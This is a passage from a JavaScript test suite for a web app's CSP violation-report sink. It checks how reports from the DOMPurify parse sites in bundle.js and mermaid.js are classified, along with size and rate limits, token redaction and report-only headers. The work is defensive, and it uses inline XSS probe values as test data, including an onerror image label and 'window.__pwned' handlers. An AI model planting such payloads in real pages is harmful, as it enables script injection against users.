    ok(sum1.sanitizer.lines === 1 && sum1.sanitizer.reports === 2 && sum1.app.lines === 0 && sum1.app.reports === 0 && sum1.noticed === 0, 'the count: the sanitizer\'s own (1 line, 2 reports) — never the app page\'s, the count that says whether the policy is complete', sum1);
    const c = await post(H, CONTROL);
    const l2 = linesOf(FH);
    ok(c.status === 204 && l2.length === 2 && !l2[1].kind && l2[1].noticed === true && H.added.length === 1 && /would block script-src-attr: inline/.test(H.added[0].text), 'CONTROL: the same attribute set by OUR code (file-viewer\'s innerHTML, the same sample) ⇒ a line of the app page and its ONE For-you notice', { l2, notices: H.added.map((x) => x.text) });
    const st = H.sink.stats();
    ok(st.sanitizer === 2 && H.sink.summary().app.lines === 1, 'stats: two reports judged the sanitizer\'s; the control counts on the app page', st);
    await H.close();
    const H2 = await hub({ dir: DH, publicDir: PUB });
    const s2 = H2.sink.summary();
    ok(s2.sanitizer.lines === 1 && s2.app.lines === 1 && H2.added.length === 0, 'a RESTART reads each line\'s kind back: 1 sanitizer line, 1 app line', s2);
    await H2.close();
  }
  {
    const DB = path.join(ROOT, 'sanitizer', 'build', 'data'); fs.mkdirSync(DB, { recursive: true });
    const H = await hub({ dir: DB, publicDir: PUB });
    await post(H, handler('window.__pwned=14', builds.suites.site, { 'source-file': `${ORIGIN}/bundle.js?v=1` }));
    const l = linesOf(path.join(DB, SINK.FILE));
    ok(l.length === 1 && !l[0].kind && H.added.length === 1 && H.sink.stats().otherBuild === 1, 'a page on ANOTHER build (its ?v= is not the bundle on disk) is not read — the report keeps its notice', { l, st: H.sink.stats() });
    await H.close();
    const DN = path.join(ROOT, 'sanitizer', 'nobundle', 'data'); fs.mkdirSync(DN, { recursive: true });
    const HN = await hub({ dir: DN, publicDir: path.join(ROOT, 'sanitizer', 'none') });
    await post(HN, MD);
    ok(linesOf(path.join(DN, SINK.FILE)).length === 1 && HN.added.length === 1, 'no bundle on disk ⇒ the report is what it always was (a line + its notice)', HN.added);
    await HN.close();
  }
  {
    const DS = path.join(ROOT, 'sanitizer', 'suite', 'data'); fs.mkdirSync(DS, { recursive: true });
    const SF = path.join(ROOT, 'sanitizer', 'suite', 'csp-reports.jsonl');
    const H = await hub({ dir: DS, file: SF, publicDir: PUB });
    await post(H, MD);
    const l = linesOf(SF);
    ok(l.length === 1 && l[0].kind === C.KIND_SANITIZER && l[0].sample === 'window.__pwned=14' && H.added.length === 0, 'a chrome suite\'s file: the line keeps its sample AND its kind (the teardown prints it, never fails on it — ⑥c)', l);
    await H.close();
  }
  // the release build on disk (what a hub serves): the site there is the release's own
  {
    fs.writeFileSync(BUNDLE, builds.release.js);
    const V2 = String(Math.floor(fs.statSync(BUNDLE).mtimeMs));
    const DR = path.join(ROOT, 'sanitizer', 'release', 'data'); fs.mkdirSync(DR, { recursive: true });
    const H = await hub({ dir: DR, publicDir: PUB });
    await post(H, handler('window.__pwned=14', builds.release.site, { 'source-file': `${ORIGIN}/bundle.js?v=${V2}` }));
    await post(H, handler('window.__pwned=14', builds.suites.site, { 'source-file': `${ORIGIN}/bundle.js?v=${V2}` }));
    const l = linesOf(path.join(DR, SINK.FILE));
    ok(l.length === 2 && l[0].kind === C.KIND_SANITIZER && !l[1].kind && H.added.length === 1, `the release build (${builds.release.site.join(':')}): its own parse site is the sanitizer's; the suites' position on it is not (a notice)`, l);
    await H.close();
  }

  // ── ③e EVERY SANITIZER THE APP SHIPS (lane csp-mermaid-sites) ──
  // The diagram library bundles its OWN DOMPurify (public/mermaid.js — src/lib/mermaid-render.js imports it lazily, stamped
  // `?v=` like the bundle): on Chrome 156 test-chat-mermaid-chrome ⑦'s probe label «<img src=x onerror=window.__pwned=1>»
  // was reported at mermaid.js 2:10038 (lane ci-mirror-hygiene, the runner) = purifyParseSites over the built file — and
  // filed a For-you notice, because the judge read /bundle.js only. The table (app-csp PARSE_SCRIPTS) is pinned on EVERY
  // script the build serves, each built here in memory — never a line:column written down (a rebuild moves it).
  console.log('③e every script the app serves with a DOMPurify is in the judge\'s table (app-csp PARSE_SCRIPTS) — mermaid.js\'s own parse is the sanitizer\'s; its other lines, and another script\'s site, are the app\'s');
  {
    const steps = String(JSON.parse(readRepo('package.json')).scripts.build).split('&&').map((x) => x.trim());
    /** an esbuild CLI step → API options; a flag the census does not know throws (a silent difference would read other bytes) */
    const optsOf = (step) => {
      const a = step.split(/\s+/), o = { entryPoints: [a[1]], loader: {} };
      for (const f of a.slice(2)) {
        if (f === '--bundle') o.bundle = true;
        else if (f === '--minify') o.minify = true;
        else if (/^--(outfile|format|platform|target)=/.test(f)) { const [k, v] = f.slice(2).split('='); o[k] = v; }
        else if (f.startsWith('--loader:')) { const [ext, l] = f.slice('--loader:'.length).split('='); o.loader[ext] = l; }
        else if (!f.startsWith('--log-level=')) throw new Error(`package.json build: an esbuild flag this census does not know: ${f}`);
      }
      return o;
    };
    const DOMPURIFY = /node_modules\/dompurify\//;
    // every esbuild step at once (esbuild's own service builds them while the noVNC step below holds this thread)
    const esSteps = steps.filter((x) => /^esbuild /.test(x)).map((step) => ({ step, o: optsOf(step) }));
    const pending = esSteps.map(({ o }) => (o.entryPoints[0] === rel.entryPoints[0] ? null // the client: ③d's release build
      : esbuild.build({ ...o, entryPoints: [path.join(REPO, o.entryPoints[0])], outfile: path.join(REPO, o.outfile), absWorkingDir: REPO, sourcemap: 'external', sourcesContent: false, metafile: true, write: false, logLevel: 'silent' })));
    // the one served script no esbuild CLI step makes: noVNC (scripts/build-novnc.mjs — patched in its own esbuild call)
    ok(steps.includes('node scripts/build-novnc.mjs'), 'the build\'s other served script is scripts/build-novnc.mjs (public/novnc.js)', steps);
    const novncOut = path.join(ROOT, 'census', 'novnc.js'); fs.mkdirSync(path.dirname(novncOut), { recursive: true });
    const nb = spawnSync(process.execPath, [path.join(REPO, 'scripts/build-novnc.mjs'), novncOut], { cwd: REPO, encoding: 'utf8' });
    ok(nb.status === 0 && fs.existsSync(novncOut), 'scripts/build-novnc.mjs built public/novnc.js\'s bytes into the scratch dir', (nb.stderr || '').slice(0, 400));
    const rows = []; // { served, dompurify (null: no metafile), sites, js, map }
    for (const [i, { step, o }] of esSteps.entries()) {
      ok(/^public\/[\w.-]+\.js$/.test(o.outfile || ''), `the build step ${o.entryPoints[0]} writes a served script (${o.outfile})`, step);
      const served = '/' + String(o.outfile).slice('public/'.length);
      if (!pending[i]) {
        ok(JSON.stringify(SYM.flagsOf(o)) === JSON.stringify(SYM.flagsOf(rel)), 'the census reads the client step as ③d\'s release build', step);
        rows.push({ served, dompurify: builds.release.inputs.some((k) => DOMPURIFY.test(k)), sites: C.purifyParseSites(builds.release.js), js: builds.release.js, map: null });
        continue;
      }
      const r = await pending[i];
      const js = Buffer.from(r.outputFiles.find((f) => f.path.endsWith('.js')).contents).toString('utf8');
      const map = JSON.parse(Buffer.from(r.outputFiles.find((f) => f.path.endsWith('.map')).contents).toString('utf8'));
      rows.push({ served, dompurify: Object.keys(r.metafile.inputs).some((k) => DOMPURIFY.test(k)), sites: C.purifyParseSites(js), js, map });
    }
    rows.push({ served: '/novnc.js', dompurify: null, sites: fs.existsSync(novncOut) ? C.purifyParseSites(fs.readFileSync(novncOut, 'utf8')) : [], js: '', map: null });
    const carry = rows.filter((x) => x.sites.length).map((x) => x.served).sort();
    const odd = rows.filter((x) => (x.dompurify === null ? x.sites.length !== 0 : x.sites.length !== (x.dompurify ? 1 : 0)));
    ok(rows.length >= 5 && !odd.length, `every script the build serves, read: ${rows.map((x) => `${x.served} ${x.sites.length ? JSON.stringify(x.sites) : '—'}`).join(' · ')} — a build that carries the dompurify package has exactly ONE parse site, one without has none`, odd.map((x) => ({ served: x.served, dompurify: x.dompurify, sites: x.sites })));
    /** what a table gets wrong against the census: a script with a parse site missing from it, a row with none */
    const tableFails = (table) => [...carry.filter((x) => !table.includes(x)).map((x) => `${x} embeds a DOMPurify and is NOT in the table`), ...table.filter((x) => !carry.includes(x)).map((x) => `${x} is in the table and its build has no DOMPurify parse`)];
    const TABLE = C.PARSE_SCRIPTS || [];
    ok(Object.isFrozen(C.PARSE_SCRIPTS) && tableFails(TABLE).length === 0 && carry.includes('/bundle.js') && carry.includes('/mermaid.js'), `THE TABLE (app-csp PARSE_SCRIPTS ${JSON.stringify(C.PARSE_SCRIPTS)}) = the served scripts whose build carries a DOMPurify: ${carry.join(', ')}`, tableFails(TABLE));
    // mermaid.js's site, pinned on ITS symbol map (as ③d pins the bundle's): every parseFromString call in it, named
    const mer = rows.find((x) => x.served === '/mermaid.js');
    const mCalls = posOf(mer.js, allAt(mer.js, '.parseFromString(', 1));
    const mSaid = SYM.lookupMany(mer.map, mCalls);
    const mIs = ([l, c]) => mSaid.get(`${l}:${c}`);
    const mPurify = mCalls.filter((x) => mIs(x) && DOMPURIFY.test(mIs(x).source) && mIs(x).name === 'parseFromString');
    ok(mPurify.length === 1 && JSON.stringify(mer.sites) === JSON.stringify(mPurify), `mermaid.js: its symbol map names DOMPurify's parse (${mPurify[0] && mIs(mPurify[0]) ? mIs(mPurify[0]).source.replace(/^(\.\.\/)+/, '').replace(/^.*node_modules\//, 'node_modules/') + ':' + mIs(mPurify[0]).line : '?'}) among its ${mCalls.length} parseFromString call(s), and purifyParseSites finds exactly it, at ${JSON.stringify(mer.sites)}`, { mCalls, mPurify, sites: mer.sites });

    // THROUGH THE SINK: public/ holds the bundle (the release build, ③d's last step) and mermaid.js, each its own stamp
    const MJS = path.join(PUB, 'mermaid.js');
    fs.writeFileSync(MJS, mer.js);
    const tB = fs.statSync(BUNDLE).mtime, tM = new Date(tB.getTime() - 3600e3);
    fs.utimesSync(MJS, tM, tM); // an hour older than the bundle: the two `?v=` differ
    const VB = String(Math.floor(fs.statSync(BUNDLE).mtimeMs)), VM = String(Math.floor(fs.statSync(MJS).mtimeMs));
    const mSite = mer.sites[0], bSite = builds.release.site;
    const from = (script, v) => ({ 'source-file': `${ORIGIN}${script}?v=${v}` });
    const LABEL = 'window.__pwned=1'; // the handler of test-chat-mermaid-chrome ⑦'s probe label
    // a handler mermaid's OWN code would set elsewhere: one of its innerHTML writes, on another line than the parse
    const mOther = posOf(mer.js, allAt(mer.js, '.innerHTML', 1)).find(([l]) => l !== mSite[0]);
    const PROBE = handler(LABEL, mSite, from('/mermaid.js', VM));
    const [pr] = C.reportsOf(JSON.stringify(PROBE), { site: true });
    ok(VB !== VM && mOther && pr && pr.site && pr.site.script === '/mermaid.js' && pr.site.v === VM && pr.site.line === mSite[0] && pr.site.column === mSite[1] && !('sample' in pr), 'reportOf(…, { site: true }) names WHICH script set it — /mermaid.js, its own ?v= (not the bundle\'s), line, column — and still no sample', { pr, VB, VM, mOther });
    let n = 0;
    const judge = async (body, o = {}) => {
      const D = path.join(ROOT, 'mermaid', String(++n), 'data'); fs.mkdirSync(D, { recursive: true });
      const H = await hub({ dir: D, publicDir: PUB, ...o });
      const a = await post(H, body);
      const out = { status: a.status, lines: linesOf(path.join(D, SINK.FILE)), notices: H.added.map((x) => x.text), stats: H.sink.stats(), summary: H.sink.summary() };
      await H.close();
      return out;
    };
    const SANITIZER = (j) => j.status === 204 && j.lines.length === 1 && j.lines[0].kind === C.KIND_SANITIZER && !j.lines[0].noticed && !j.notices.length && j.summary.sanitizer.lines === 1 && j.summary.app.lines === 0;
    const APP = (j) => j.status === 204 && j.lines.length === 1 && !j.lines[0].kind && j.lines[0].noticed === true && j.notices.length === 1 && /would block script-src-attr: inline/.test(j.notices[0]) && j.summary.app.lines === 1 && j.summary.sanitizer.lines === 0;
    const CASES = [
      ['the hostile diagram label\'s report AT mermaid.js\'s own parse site ⇒ the SANITIZER\'s: one `sanitizer-parse` line, NO For-you notice, counted apart', PROBE, SANITIZER],
      ['CONTROL — the same directive and handler from mermaid.js at ANOTHER line (one of its own innerHTML writes) ⇒ the app\'s: a line and its For-you notice', handler(LABEL, mOther, from('/mermaid.js', VM)), APP],
      ['mermaid.js on ANOTHER build (its ?v= is not the file on disk) ⇒ not read: the notice', handler(LABEL, mSite, from('/mermaid.js', '1')), (j) => APP(j) && j.stats.otherBuild === 1],
      ['mermaid.js stamped with the BUNDLE\'s ?v= ⇒ another build of mermaid.js (each script by its own stamp): the notice', handler(LABEL, mSite, from('/mermaid.js', VB)), (j) => APP(j) && j.stats.otherBuild === 1],
      ['the bundle\'s parse site named in mermaid.js ⇒ not mermaid\'s (each script its own sites, never a union): the notice', handler(LABEL, bSite, from('/mermaid.js', VM)), APP],
      ['mermaid.js\'s parse site named in the bundle ⇒ not the bundle\'s: the notice', handler(LABEL, mSite, from('/bundle.js', VB)), APP],
      ['the bundle\'s own parse site beside mermaid.js on disk ⇒ still the sanitizer\'s', handler(LABEL, bSite, from('/bundle.js', VB)), SANITIZER],
    ];
    for (const [why, body, want] of CASES) { const j = await judge(body); ok(want(j), why, j); }
    {
      // no mermaid.js on disk (a public/ with the bundle only): its report keeps the notice, the bundle's is still judged
      const P2 = path.join(ROOT, 'mermaid', 'bundle-only', 'public'); fs.mkdirSync(P2, { recursive: true });
      fs.copyFileSync(BUNDLE, path.join(P2, 'bundle.js'));
      const VB2 = String(Math.floor(fs.statSync(path.join(P2, 'bundle.js')).mtimeMs));
      const a = await judge(PROBE, { publicDir: P2 }), b = await judge(handler(LABEL, bSite, from('/bundle.js', VB2)), { publicDir: P2 });
      ok(APP(a) && SANITIZER(b), 'no mermaid.js on disk ⇒ its report is what it always was (a line + its notice); the bundle beside it is still judged', { a, b });
    }
    {
      // THE PLANTED REMOVAL: /mermaid.js cut from the table ⇒ the census names it, and behind the REAL sink's code the
      // hostile diagram's report files the For-you notice again
      const src = readRepo('src/app-csp.js'), row = "const PARSE_SCRIPTS = Object.freeze(['/bundle.js', '/mermaid.js']);";
      ok(src.split(row).length === 2, 'the mutant anchor (the table\'s one row) is in src/app-csp.js');
      const MD = path.join(ROOT, 'mutant-table', 'src'); fs.mkdirSync(path.join(MD, 'server'), { recursive: true });
      fs.writeFileSync(path.join(MD, 'app-csp.js'), src.replace(row, "const PARSE_SCRIPTS = Object.freeze(['/bundle.js']);"));
      const M = require(path.join(MD, 'app-csp.js'));
      const cut = tableFails(M.PARSE_SCRIPTS);
      ok(cut.length === 1 && cut[0] === '/mermaid.js embeds a DOMPurify and is NOT in the table', `MUTANT (/mermaid.js cut from the table) ⇒ RED by name: «${cut.join('; ')}»`, cut);
      const MS = load(path.join(MD, 'server', 'csp-reports.js'), readRepo('src/server/csp-reports.js')); // its require('../app-csp.js') = the mutant
      const j = await judge(PROBE, { sinkModule: MS });
      ok(APP(j), 'MUTANT (/mermaid.js cut from the table) ⇒ RED: behind the real sink\'s code the hostile diagram\'s report files a For-you notice again', j);
    }
  }
}

// ── ③b A TOKEN IN A PATH SEGMENT (B-a35f, q-043 verify L4) ──
console.log('③b a token in a kept path segment lands as <token> — the stored line and the For-you notice');
{
  const DT = path.join(ROOT, 'token', 'data'); fs.mkdirSync(DT, { recursive: true });
  const H = await hub({ dir: DT });
  const TOK = ['Zq', '9x'.repeat(15)].join('');   // 32 characters of [A-Za-z0-9_-], built at run time (the secret scan)
  const r = await post(H, report({ 'blocked-uri': `https://share.example.net/share/${TOK}/x?k=1` }));
  const ln = linesOf(path.join(DT, SINK.FILE));
  ok(r.status === 204 && ln.length === 1 && ln[0].blocked === 'https://share.example.net/share/<token>/x' && H.added.length === 1 && H.added[0].text.includes('https://share.example.net/share/<token>/x') && H.added[0].i18n.text.params.blocked === 'https://share.example.net/share/<token>/x',
    'a blocked URL /share/<32 characters>/x ⇒ the stored line and the For-you notice (its text and its words) hold `<token>`', { line: ln[0], notice: H.added[0] && H.added[0].text });
  ok(!fs.readFileSync(path.join(DT, SINK.FILE), 'utf8').includes(TOK) && !JSON.stringify(H.added).includes(TOK), 'the token is nowhere — not data/csp-reports.jsonl, not the notice\'s text, detail or words');
  await H.close();
}

// ── ④ BOUNDS ──
console.log('④ bounds — body, type, pace, rotation, the day\'s notices');
{
  const D = path.join(ROOT, 'two', 'data'); fs.mkdirSync(D, { recursive: true });
  const F = path.join(D, SINK.FILE);
  const H = await hub({ dir: D, fileMax: 900, noticesPerDay: 3 });
  const big = Buffer.alloc(10 * 1024 * 1024, 0x20); big.write(JSON.stringify(report()));
  const r10 = await post(H, null, { raw: big });
  ok(r10.status === 413 && linesOf(F).length === 0, 'a 10 MB body ⇒ 413, nothing lands', { status: r10.status, error: r10.error });
  const chunked = await new Promise((resolve) => {   // no content-length: the reader stops at 32 KB
    const r = http.request({ host: '127.0.0.1', port: H.port, path: C.REPORT_PATH, method: 'POST', headers: { 'content-type': 'application/csp-report', 'transfer-encoding': 'chunked' } }, (x) => { x.resume(); x.on('end', () => resolve(x.statusCode)); });
    r.on('error', () => resolve(0));
    for (let i = 0; i < 40; i++) r.write(Buffer.alloc(1024, 0x20)); r.end();
  });
  ok(chunked === 413 && linesOf(F).length === 0, 'a chunked body past 32 KB ⇒ 413 (never buffered past the bound)', chunked);
  const t = await post(H, report(), { type: 'text/plain' });
  ok(t.status === 415 && linesOf(F).length === 0, 'not a report content type (text/plain — what a page on another site could send without a preflight) ⇒ 415', t.status);
  const rapi = await post(H, [{ type: 'csp-violation', body: { effectiveDirective: 'worker-src', blockedURL: 'blob', documentURL: 'http://h/' } }], { type: 'application/reports+json' });
  ok(rapi.status === 204 && linesOf(F).some((l) => l.directive === 'worker-src'), 'application/reports+json lands too', rapi.status);
  for (let i = 0; i < 6; i++) await post(H, report({ 'blocked-uri': `https://h${i}.example.net/x` }));
  ok(H.added.length === 3 && H.sink.stats().held >= 3, '≤ noticesPerDay new pairs file a notice; the rest are lines (they file on a later day)', { notices: H.added.length, stats: H.sink.stats() });
  ok(fs.existsSync(F + '.1') && fs.statSync(F).size <= 900, 'past the cap the file rotates to .1 (one generation kept)', { rotated: fs.existsSync(F + '.1'), size: fs.statSync(F).size });
  const sm = H.sink.summary();
  ok(sm.app.lines + sm.frames.lines === linesOf(F).length + linesOf(F + '.1').length, 'the count of lines on disk follows the rotation (this file + its .1 — what a restart reads back)', { sm, cur: linesOf(F).length, old: linesOf(F + '.1').length });
  const H3 = await hub({ dir: path.join(ROOT, 'pace', 'data') });
  const st = []; for (let i = 0; i < 64; i++) st.push((await post(H3, report({ 'blocked-uri': `https://n${i}.example.net/x` }))).status);
  ok(st.slice(0, 60).every((x) => x === 204) && st.slice(60).every((x) => x === 429) && H3.sink.stats().paced === 4, 'the 61st post a minute from one address that would ADD a line ⇒ 429 (counted, not logged)', { st: st.slice(55), stats: H3.sink.stats() });
  const rep = []; for (let i = 0; i < 100; i++) rep.push((await post(H3, report({ 'blocked-uri': 'https://n0.example.net/x' }))).status);
  ok(rep.every((x) => x === 204) && H3.sink.stats().paced === 4, 'a REPEAT is never paced (it writes nothing) — a burst of repeats cannot hide the next new report', { codes: [...new Set(rep)], stats: H3.sink.stats() });
  await H3.close();
  ok(SINK.BODY_MAX === 32 * 1024 && SINK.FILE_MAX === 1024 * 1024 && SINK.PACE_PER_MIN === 60, 'the bounds are 32 KB a body, 1 MB a file, 60 a minute an address');
  await H.close();
}

// ── ⑤ THE APP PAGE ──
console.log('⑤ the app page — server.js\'s own index route and sink line, verbatim');
const SRV = readRepo('server.js');
const sinkLine = SRV.split('\n').find((l) => l.startsWith('const cspReports = require('));
const i0 = SRV.indexOf("app.get(['/', '/index.html'], (req, res, next) => {"), i1 = SRV.indexOf('\n});\n', i0) + 5;
const indexRoute = i0 >= 0 ? SRV.slice(i0, i1) : '';
ok(!!sinkLine && /file: process\.env\.VIBESPACE_CSP_REPORTS_FILE/.test(sinkLine) && /cspReports\.register\(app\)/.test(sinkLine), 'server.js makes the sink with VIBESPACE_CSP_REPORTS_FILE and registers its route', sinkLine);
ok(/res\.set\(\.\.\.cspReports\.header\(\)\)/.test(indexRoute), 'the index route sets the sink\'s header');
{
  const at = (needle) => SRV.indexOf(needle);
  ok(at('app.use(auth.middleware());') < at(sinkLine) && at(sinkLine) < at('const jsonBody = express.json('), 'the sink mounts AFTER the gate (its door is the gate\'s) and BEFORE the json body parser (it reads its own 32 KB)');
}
async function appPage({ env = null } = {}) {
  const dir = path.join(ROOT, 'srv-' + Math.random().toString(16).slice(2)); fs.mkdirSync(path.join(dir, 'public'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'public', 'index.html'), '<!doctype html><html><head><link rel="stylesheet" href="/style.css"></head><body><script src="/bundle.js"></script></body></html>');
  fs.writeFileSync(path.join(dir, 'public', 'style.css'), ''); fs.writeFileSync(path.join(dir, 'public', 'bundle.js'), '');
  const app = express();
  const req = (m) => require(m.startsWith('./') ? path.join(REPO, m) : m);
  const prev = process.env.VIBESPACE_CSP_REPORTS_FILE;
  if (env) process.env.VIBESPACE_CSP_REPORTS_FILE = env; else delete process.env.VIBESPACE_CSP_REPORTS_FILE;
  try { new Function('app', 'require', 'path', 'fs', '__dirname', 'userTodos', 'console', `${sinkLine}\n${indexRoute}\nreturn cspReports;`)(app, req, path, fs, dir, null, { log() { }, warn() { } }); }
  finally { if (prev === undefined) delete process.env.VIBESPACE_CSP_REPORTS_FILE; else process.env.VIBESPACE_CSP_REPORTS_FILE = prev; }
  const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
  return { dir, port: srv.address().port, close: () => new Promise((c) => srv.close(c)) };
}
const get = (port, p) => new Promise((resolve) => http.get({ host: '127.0.0.1', port, path: p, headers: { accept: 'text/html' } }, (x) => { let d = ''; x.on('data', (c) => { d += c; }); x.on('end', () => resolve({ status: x.statusCode, headers: x.headers, text: d })); }).on('error', (e) => resolve({ status: 0, error: e.code })));
/** The enforcing-header verdict for one response: null = only the report-only header, with every pin. */
const pageVerdict = (headers, M = C) => (headers['content-security-policy'] ? 'the ENFORCING header is sent' : !headers[M.HEADER.toLowerCase()] ? `no ${M.HEADER}` : M.HEADER !== 'Content-Security-Policy-Report-Only' ? `${M.HEADER} is not the report-only header` : (pinFails(headers[M.HEADER.toLowerCase()]).join('; ') || null));
{
  const P = await appPage();
  for (const p of ['/', '/index.html']) {
    const r = await get(P.port, p);
    ok(r.status === 200 && pageVerdict(r.headers) === null && /bundle\.js\?v=/.test(r.text), `GET ${p}: Content-Security-Policy-Report-Only with every pin; the enforcing header is NOT sent`, { status: r.status, verdict: pageVerdict(r.headers) });
  }
  const r = await post({ port: P.port }, report());
  ok(r.status === 204 && linesOf(path.join(P.dir, 'data', SINK.FILE)).length === 1, 'a report to that hub lands in ITS data/csp-reports.jsonl', r.status);
  await P.close();
  const ENVF = path.join(ROOT, 'env-file', 'reports.jsonl');
  const Q = await appPage({ env: ENVF });
  await post({ port: Q.port }, report());
  ok(linesOf(ENVF).length === 1 && !fs.existsSync(path.join(Q.dir, 'data', SINK.FILE)), 'VIBESPACE_CSP_REPORTS_FILE set ⇒ the hub writes THERE (the chrome suites\' one file), not data/', { env: linesOf(ENVF).length });
  await Q.close();
  // MUTANT: the header renamed to the enforcing one
  const M = load(path.join(REPO, 'src/app-csp.js'), readRepo('src/app-csp.js').replace("const HEADER = 'Content-Security-Policy-Report-Only';", "const HEADER = 'Content-Security-Policy';"));
  const v = pageVerdict({ [M.HEADER.toLowerCase()]: M.appPolicy() }, M);
  ok(v && /ENFORCING/.test(v), 'MUTANT (the header renamed to Content-Security-Policy) ⇒ RED: the enforcing header is sent', v);
}
{
  const dir = path.join(ROOT, 'auth'); fs.mkdirSync(dir, { recursive: true });
  const auth = new Auth(dir, {}); auth.setPassword('pw-csp-77');
  const app = express(); app.use(auth.middleware()); auth.registerRoutes(app); app.post('/api/csp-report', (req, res) => res.status(204).end());
  const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
  const port = srv.address().port;
  const r = await get(port, '/login'), r2 = await get(port, '/login');
  const pol = r.headers[C.HEADER.toLowerCase()] || '';
  const nonce = (/<script nonce="([^"]+)">/.exec(r.text) || [])[1];
  ok(r.status === 200 && !r.headers['content-security-policy'] && !!nonce && pol.includes(`'nonce-${nonce}'`) && /object-src 'none'/.test(pol) && /report-uri \/api\/csp-report/.test(pol), 'the sign-in page: report-only, its one inline script carries this response\'s nonce (in the policy), object-src \'none\'', { pol, nonce });
  ok(nonce !== (/<script nonce="([^"]+)">/.exec(r2.text) || [])[1], 'a fresh nonce per response');
  const x = await post({ port }, report());
  const xs = await new Promise((resolve) => { const b = JSON.stringify(report()); const q = http.request({ host: '127.0.0.1', port, path: '/api/csp-report', method: 'POST', headers: { 'content-type': 'application/csp-report', 'content-length': Buffer.byteLength(b), origin: 'null', 'sec-fetch-site': 'cross-site' } }, (y) => { y.resume(); y.on('end', () => resolve(y.statusCode)); }); q.end(b); });
  const other = await post({ port }, {}, { type: 'application/json', p: '/api/other' });
  ok(x.status === 204 && xs === 204 && other.status === 401, 'POST /api/csp-report passes the sign-in gate with no cookie — a sandboxed frame\'s (Origin null, cross-site) too; any other route without the cookie ⇒ 401', { x: x.status, xs, other: other.status });
  await new Promise((c) => srv.close(c));
}

// ── ⑥ THE CHROME SUITES' TEARDOWN ──
console.log('⑥ the chrome suites\' teardown — a report at the end of a suite FAILS it');
{
  const dir = path.join(ROOT, 'suite'); fs.mkdirSync(dir, { recursive: true });
  const child = (name, scratchMjs, plant) => {
    const f = path.join(dir, name);
    fs.writeFileSync(f, `const S = await import(${JSON.stringify(scratchMjs)});\n`
      + `const file = process.env[S.CSP_REPORTS_ENV || 'VIBESPACE_CSP_REPORTS_FILE'];\n`
      + (plant ? `const fs = await import('node:fs'); const path = await import('node:path'); fs.mkdirSync(path.dirname(file), { recursive: true }); fs.appendFileSync(file, JSON.stringify({ directive: 'img-src', blocked: 'https://planted.example' }) + '\\n');\n` : '')
      + `console.log('FILE ' + file); console.log('ALL PASS (1)'); process.exit(0);\n`);
    const r = spawnSync(process.execPath, [f], { encoding: 'utf8', env: { ...process.env, VIBESPACE_CSP_REPORTS_FILE: '' } });
    const file = (/^FILE (\/tmp\/vs-csp-reports-\d+\/csp-reports\.jsonl)$/m.exec(r.stdout) || [])[1];
    if (file) fs.rmSync(path.dirname(file), { recursive: true, force: true }); // the mutant child's hook never removes it
    return { rc: r.status, out: r.stdout + r.stderr };
  };
  const SCR = path.join(REPO, 'scripts', 'scratch.mjs');
  const red = child('test-csp-child-red.mjs', SCR, true), green = child('test-csp-child-green.mjs', SCR, false);
  ok(red.rc === 1 && /CSP: the app page reported 1/.test(red.out) && /planted\.example/.test(red.out), 'a suite whose hub got a report ⇒ exit 1, the report printed (after its own ALL PASS)', red);
  ok(green.rc === 0, 'a suite with no report ⇒ exit 0', green);
  const src = readRepo('scripts/scratch.mjs');
  const cut = "if (CSP_REPORTS_FILE) { process.env[CSP_REPORTS_ENV] = CSP_REPORTS_FILE; process.on('exit', cspReportsAtExit); }";
  ok(src.includes(cut), 'the mutant anchor (the exit hook) is in scripts/scratch.mjs');
  const mut = path.join(dir, 'scratch-mutant.mjs');
  fs.writeFileSync(mut, src.replace(cut, "if (CSP_REPORTS_FILE) { process.env[CSP_REPORTS_ENV] = CSP_REPORTS_FILE; }").replace(/from '\.\//g, `from '${path.join(REPO, 'scripts')}/`).replace(/require\('\.\.\//g, `require('${REPO}/`));
  const m = child('test-csp-child-mutant.mjs', mut, true);
  ok(m.rc === 0, 'MUTANT (the exit check cut) ⇒ RED: the reported suite passes', m);
}

// ── ⑥b THE TEARDOWN SAYS WHAT WAS REPORTED (lane chrome-156-drift) ──
console.log('⑥b the teardown\'s words: the sample, where the code ran, the Chrome 156 handler rule');
{
  const runner = { at: 'x', directive: 'script-src-attr', blocked: 'inline', source: '', line: 1, column: 101, document: 'http://127.0.0.1:1/', disposition: 'report', sample: 'window.__xss=1' };
  const w = cspWhat(JSON.stringify(runner));
  ok(w.includes('«window.__xss=1»') && /NO URL at 1:101/.test(w) && /SUITE evaluated over CDP/.test(w) && /Chrome 156/.test(w) && /blank tab/.test(w), 'the runner\'s line (script-src-attr inline, no source, 1:101) now reads: the handler «window.__xss=1», code with NO URL = the suite\'s own Runtime.evaluate, the Chrome 156 rule and where a markup control belongs', w);
  const bundle = cspWhat({ ...runner, source: 'http://127.0.0.1:1/dist/app.js', line: 2, column: 18545, sample: undefined });
  ok(/code in http:\/\/127\.0\.0\.1:1\/dist\/app\.js at 2:18545/.test(bundle) && /no sample/.test(bundle), 'a line from the bundle names the file and position, and says when no sample was kept', bundle);
  ok(/^img-src https:\/\/cdn\.example\.net\/a — https:\/\/cdn\.example\.net\/a,/.test(cspWhat({ directive: 'img-src', blocked: 'https://cdn.example.net/a', source: '', line: null, column: null, document: 'about' })) && cspWhat('not json') === 'an unreadable line', 'a non-script line names what was blocked; an unreadable line says so');
}

// ── ⑥c A SANITIZER LINE IS PRINTED, NEVER A FAILURE (lane chrome-156-followups) ──
console.log('⑥c the teardown: a line of the sanitizer\'s parse is printed and the suite passes; any other line still fails it');
{
  const dir = path.join(ROOT, 'suite6c'); fs.mkdirSync(dir, { recursive: true });
  const SCR = path.join(REPO, 'scripts', 'scratch.mjs');
  const LINE = { at: 'x', directive: 'script-src-attr', blocked: 'inline', source: 'http://127.0.0.1:1/bundle.js', line: 127564, column: 35, document: 'http://127.0.0.1:1/', disposition: 'report', sample: 'window.__pwned=14', kind: C.KIND_SANITIZER };
  const child = (name, lines) => {
    const f = path.join(dir, name);
    fs.writeFileSync(f, `const S = await import(${JSON.stringify(SCR)});\n`
      + `const file = process.env[S.CSP_REPORTS_ENV];\n`
      + `const fs = await import('node:fs'); const path = await import('node:path'); fs.mkdirSync(path.dirname(file), { recursive: true });\n`
      + `for (const l of ${JSON.stringify(lines)}) fs.appendFileSync(file, JSON.stringify(l) + '\\n');\n`
      + `console.log('ALL PASS (1)'); process.exit(0);\n`);
